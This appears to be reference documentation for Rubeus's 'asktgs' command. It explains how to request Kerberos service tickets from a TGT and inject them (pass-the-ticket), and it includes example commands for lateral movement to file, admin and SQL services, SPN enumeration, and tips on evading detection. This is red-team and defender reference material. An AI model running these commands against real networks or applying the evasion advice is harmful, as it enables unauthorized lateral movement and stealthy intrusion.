## Overview

Request service tickets (TGS) for specific services using an existing Ticket Granting Ticket (TGT). This command enables access to specific services and is essential for lateral movement and service access in Kerberos environments.

```mermaid
sequenceDiagram
    participant Client as 👤 Client<br/>(User/Attacker)
    participant KDC as 🏛️ Key Distribution Center<br/>(Domain Controller)
    participant Service as 🖥️ Target Service<br/>(File Server, SQL, etc.)

    Client->>+KDC: 3. TGS-REQ: Request Service Ticket<br/>Rubeus: asktgs /service:cifs/fileserver
    Note right of Client: Using TGT from Phase 1<br/>+ Target Service SPN

    KDC-->>Client: 4. TGS-REP: Service Ticket<br/>Encrypted with service key
    Note left of KDC: Attack Opportunities:<br/>kerberoast (extract & crack)<br/>s4u (delegation abuse)<br/>tgssub (ticket substitution)
```



## Syntax

```bash
Rubeus.exe asktgs /ticket:TGT /service:SPN [options]
```

## Required Parameters

<ParamField path="ticket" type="string" required>
  Base64-encoded TGT or path to .kirbi file
</ParamField>

<ParamField path="service" type="string" required>
  Target service SPN(s) - comma-separated for multiple services
</ParamField>

## Optional Parameters

<ParamField path="dc" type="string">
  Domain controller to target
</ParamField>

<ParamField path="outfile" type="string">
  Save service ticket to file
</ParamField>

<ParamField path="ptt" type="boolean">
  Pass-the-ticket (inject service ticket)
</ParamField>

<ParamField path="enterprise" type="boolean">
  Use enterprise principal format
</ParamField>

<ParamField path="u2u" type="boolean">
  Request User-to-User authentication ticket
</ParamField>

<ParamField path="enctype" type="string">
  Request specific encryption type (DES|RC4|AES128|AES256)
</ParamField>

## Examples

<CodeGroup>
```bash Basic Service Tickets
# Request CIFS ticket for file access
Rubeus.exe asktgs /ticket:doIFuj... /service:cifs/fileserver.corp.local /ptt

# Request HTTP ticket for web service
Rubeus.exe asktgs /ticket:doIFuj... /service:http/webserver.corp.local /ptt

# Request multiple service tickets
Rubeus.exe asktgs /ticket:doIFuj... /service:cifs/server1.corp.local,http/server2.corp.local
```

```bash Administrative Access
# Request HOST ticket for admin access
Rubeus.exe asktgs /ticket:doIFuj... /service:host/target.corp.local /ptt

# Request LDAP ticket for directory access
Rubeus.exe asktgs /ticket:doIFuj... /service:ldap/dc01.corp.local /ptt

# Request RPCSS ticket for RPC services
Rubeus.exe asktgs /ticket:doIFuj... /service:rpcss/target.corp.local /ptt
```

```bash Database and Application Access
# Request SQL Server ticket
Rubeus.exe asktgs /ticket:doIFuj... /service:MSSQLSvc/sql01.corp.local:1433 /ptt

# Request Exchange service ticket
Rubeus.exe asktgs /ticket:doIFuj... /service:exchangeMDB/mail01.corp.local /ptt
```
</CodeGroup>

## Service Principal Names (SPNs)

<Accordion title="Common Service Types">
  **File and Print Services:**
  - `cifs/server.domain.com` - SMB/CIFS file sharing
  - `nfs/server.domain.com` - Network File System

  **Web Services:**
  - `http/webserver.domain.com` - HTTP web services
  - `https/webserver.domain.com` - HTTPS secure web

  **Administrative Services:**
  - `host/computer.domain.com` - General host services
  - `rpcss/server.domain.com` - RPC endpoint mapper

  **Directory Services:**
  - `ldap/dc.domain.com` - LDAP directory access
  - `gc/dc.domain.com` - Global catalog access
</Accordion>

<Accordion title="Database Services">
  **SQL Server:**
  - `MSSQLSvc/server.domain.com:1433` - Default instance
  - `MSSQLSvc/server.domain.com:NAMED` - Named instance

  **Oracle:**
  - `oracle/server.domain.com` - Oracle database

  **Other Databases:**
  - `postgres/server.domain.com` - PostgreSQL
  - `mysql/server.domain.com` - MySQL
</Accordion>

## Advanced Options

<Accordion title="Enterprise Principal Format">
  **Standard vs Enterprise:**
  ```bash
  # Standard format
  /service:cifs/server.corp.local

  # Enterprise format (useful for cross-domain)
  /service:user@domain.com /enterprise
  ```

  **Benefits of Enterprise Format:**
  - Works across domain trusts
  - Simplifies cross-domain access
  - Handles complex forest scenarios
</Accordion>

<Accordion title="User-to-User Authentication">
  **U2U Protocol:**
  ```bash
  /u2u /service:krbtgt/domain.com
  ```

  **Use Cases:**
  - Bypass service key requirements
  - Access services without knowing service account password
  - Specialized authentication scenarios
</Accordion>

## Encryption Type Handling

<Accordion title="Encryption Negotiation">
  **Automatic Selection:**
  - Client and server negotiate highest supported encryption
  - Typically results in AES256 in modern environments
  - Falls back to RC4 for legacy compatibility

  **Explicit Type Request:**
  ```bash
  # Request specific encryption
  /enctype:AES256  # Preferred for OPSEC
  /enctype:RC4     # Compatible but detectable
  /enctype:AES128  # Balance of security and performance
  ```
</Accordion>

## Lateral Movement Applications

<Accordion title="File System Access">
  **SMB/CIFS Access:**
  ```bash
  # Get CIFS ticket and access files
  Rubeus.exe asktgs /ticket:TGT /service:cifs/fileserver.corp.local /ptt

  # Then access via UNC path
  dir \\fileserver.corp.local\share
  ```
</Accordion>

<Accordion title="Administrative Access">
  **Remote Administration:**
  ```bash
  # Get HOST ticket for admin access
  Rubeus.exe asktgs /ticket:TGT /service:host/target.corp.local /ptt

  # Use for WMI, services, registry, etc.
  wmic /node:target.corp.local process list
  ```
</Accordion>

<Accordion title="Database Access">
  **SQL Server Access:**
  ```bash
  # Get SQL Server ticket
  Rubeus.exe asktgs /ticket:TGT /service:MSSQLSvc/sql01.corp.local:1433 /ptt

  # Connect to database
  sqlcmd -S sql01.corp.local -E
  ```
</Accordion>

## Service Discovery

<Accordion title="SPN Enumeration">
  **PowerShell Discovery:**
  ```powershell
  # Find SPNs for target
  setspn -L target.corp.local

  # Search for service types
  Get-ADUser -Filter {ServicePrincipalName -like "*SQL*"}
  ```

  **LDAP Queries:**
  ```bash
  # Using ldapsearch
  ldapsearch -h dc.corp.local -b "dc=corp,dc=local" "serviceprincipalname=*"
  ```
</Accordion>

## Pass-the-Ticket Integration

<Accordion title="Automatic Injection">
  **Using /ptt flag:**
  ```bash
  # Automatically inject service ticket
  Rubeus.exe asktgs /ticket:TGT /service:cifs/server.corp.local /ptt
  ```

  **Manual Injection:**
  ```bash
  # Get ticket to file, then inject separately
  Rubeus.exe asktgs /ticket:TGT /service:cifs/server.corp.local /outfile:service.kirbi
  Rubeus.exe ptt /ticket:service.kirbi
  ```
</Accordion>

## Error Handling

<Accordion title="Common Errors">
  **Service Not Found:**
  ```text
  KDC_ERR_S_PRINCIPAL_UNKNOWN
  ```
  - SPN doesn't exist or is misspelled
  - Service not registered in Active Directory

  **Access Denied:**
  ```text
  KDC_ERR_BADOPTION
  ```
  - TGT doesn't have required privileges
  - Service account restrictions

  **Encryption Issues:**
  ```text
  KDC_ERR_ETYPE_NOSUPP
  ```
  - Requested encryption type not supported
  - Encryption downgrade policies
</Accordion>

## Operational Security

<Accordion title="Detection Considerations">
  **Event Logs:**
  - Event ID 4769 (Service ticket requested)
  - Multiple rapid service ticket requests
  - Unusual service access patterns

  **Behavioral Indicators:**
  - Service tickets without subsequent service access
  - Bulk SPN enumeration
  - Cross-domain service requests
</Accordion>

<Accordion title="Evasion Techniques">
  **Targeted Requests:**
  - Request only needed service tickets
  - Space out requests over time
  - Use legitimate service patterns

  **Encryption Selection:**
  - Prefer AES encryption when possible
  - Match environment encryption standards
  - Avoid RC4 in modern environments
</Accordion>

## Related Commands

- [`asktgt`](/GhostPack/Rubeus-mdx/commands/ticket-requests/asktgt) - Request TGT for service ticket requests
- [`ptt`](/GhostPack/Rubeus-mdx/commands/management/ptt) - Pass service tickets to current session
- [`s4u`](/GhostPack/Rubeus-mdx/commands/delegation/s4u) - Use service tickets for delegation abuse
- [`describe`](/GhostPack/Rubeus-mdx/commands/management/describe) - Analyze service ticket contents